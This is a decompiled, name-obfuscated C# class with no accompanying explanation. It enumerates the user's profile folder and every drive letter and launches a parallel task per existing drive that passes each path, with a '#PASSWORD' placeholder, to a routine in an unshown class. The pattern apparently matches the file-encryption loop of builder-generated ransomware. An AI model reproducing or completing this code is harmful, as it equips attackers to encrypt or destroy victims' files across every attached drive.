using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace ns0;

internal class Class4
{
	[CompilerGenerated]
	private sealed class Class5
	{
		public string string_0;

		public Class4 class4_0;

		internal void method_0()
		{
			class4_0.class6_0.method_0(string_0, "#PASSWORD");
		}
	}

	private readonly Class6 class6_0 = new Class6();

	private readonly List<Task> list_0 = new List<Task>();

	private readonly string[] string_0 = new string[26]
	{
		"C:\\Users\\" + Environment.UserName,
		"K:\\",
		"L:\\",
		"M:\\",
		"N:\\",
		"O:\\",
		"D:\\",
		"A:\\",
		"B:\\",
		"F:\\",
		"Q:\\",
		"G:\\",
		"H:\\",
		"R:\\",
		"S:\\",
		"J:\\",
		"U:\\",
		"W:\\",
		"V:\\",
		"X:\\",
		"T:\\",
		"Y:\\",
		"Z:\\",
		"E:\\",
		"P:\\",
		"I:\\"
	};

	internal void method_0()
	{
		string[] array = this.string_0;
		foreach (string string_0 in array)
		{
			if (Directory.Exists(string_0))
			{
				Task item = Task.Factory.StartNew(delegate
				{
					class6_0.method_0(string_0, "#PASSWORD");
				});
				list_0.Add(item);
			}
		}
		Task.WaitAll(list_0.ToArray());
	}
}
